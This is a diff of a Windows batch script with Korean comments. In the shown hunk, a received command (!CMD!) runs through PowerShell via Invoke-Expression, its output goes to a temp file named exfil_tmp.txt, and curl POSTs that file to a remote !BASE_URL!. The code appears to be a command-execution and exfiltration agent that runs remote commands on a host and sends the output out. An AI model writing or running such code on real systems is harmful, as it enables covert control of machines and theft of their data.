@@ -69,7 +69,7 @@ if defined MATCHED (
 
     :: PowerShell로 실행 → Out-String으로 줄바꿈 보존 → 임시 파일 저장
     set "TMPFILE=%TEMP%\exfil_tmp.txt"
-    powershell -NoProfile -Command "$h='===cmd: !CMD!==='; $r = (!CMD! | Out-String); ($h + \"`r`n\" + $r) | Set-Content -Encoding UTF8 '!TMPFILE!'"
+    powershell -NoProfile -Command "[Console]::OutputEncoding=[System.Text.Encoding]::GetEncoding(949); $h='===cmd: !CMD!==='; $r=(Invoke-Expression '!CMD!') | Out-String; ($h + \"`r`n\" + $r) | Set-Content -Encoding UTF8 '!TMPFILE!'"
 
     :: --data-binary 로 줄바꿈 그대로 전송
     curl.exe -s -o nul -w "%%{http_code}" -X POST !BASE_URL!/!FNAME! --data-binary @"!TMPFILE!" > "%TEMP%\exfil_status.txt" 2> "%TEMP%\exfil_err.txt"
